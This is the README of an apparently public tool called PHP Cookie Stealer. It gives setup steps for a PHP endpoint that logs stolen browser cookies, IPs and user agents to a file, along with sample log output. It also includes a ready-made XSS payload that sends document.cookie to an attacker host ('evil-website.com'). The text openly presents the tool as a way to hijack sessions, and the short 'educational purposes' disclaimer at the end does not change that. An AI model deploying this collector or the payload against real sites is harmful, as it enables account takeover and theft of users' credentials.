# PHP Cookie Stealer
The PHP cookie stealer is a tool that can be used in penetration testing and XSS attacks to steal browser cookies from victims. The tool works by setting up a server that listens for incoming requests with a specific cookie value. When a request is received, the tool logs various information about the request, including the date and time, client IP address, user agent, referer, and cookie value, to a file.

This tool can be used by attackers to steal sensitive information, such as session tokens and authentication credentials, from unsuspecting users. By stealing a user's browser cookies, an attacker can gain unauthorized access to the user's account and perform actions on their behalf.

## Usage

1. Clone PHP Cookie Stealer Project
```
git clone https://github.com/TheWation/PhpCookieStealer
```

2. Install a web server with PHP support on your machine if you haven't already. For example, you can install XAMPP, which includes Apache and PHP, from the official website: https://www.apachefriends.org/index.html

3. Create a new directory for your project and navigate into it using a terminal or command prompt.

4. Create a new file called index.php and copy the PHP code into it.

5. Start the web server and navigate to http://localhost/your-project-name/index.php?cookie=your-cookie-value in your web browser, replacing your-project-name with the name of the directory where your project is located, and your-cookie-value with the value of the cookie that you want to log. For example, if the cookie value is ABC123, you would visit http://localhost/your-project-name/index.php?cookie=ABC123.

6. The server will log the date and time, client IP address, user agent, referer, and cookie value to the cookies.txt file in the project directory.
```
[+] Date: 2022/10/03 15:30:45
[+] IP: 127.0.0.1
[+] UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
[+] Referer: http://localhost/your-project-name/index.php
[+] Cookies: ABC123
---
```

7. The server will also return a response with a status code of 200 if the request was successful, or a status code of 500 if there was an error writing to the file.

8. You can repeat step 4 with different cookie values to log additional data to the file.

9. To stop the server, stop the web server software.

## Example Payload
```
https://pentest.target/?name=<img src=x onerror=this.src='http://evil-website.com/input.php?cookie='+document.cookie>
```

## Disclaimer
For educational purposes only. Do not use for illegal activities. Use at your own risk. By using this tool, you agree to comply with all applicable laws and regulations. Unauthorized use is strictly prohibited. Always obtain permission before using this tool. No warranties.

## License

`WebSecurityVision` is made with ♥  by [Wation](https://github.com/TheWation) and it's released under the MIT license.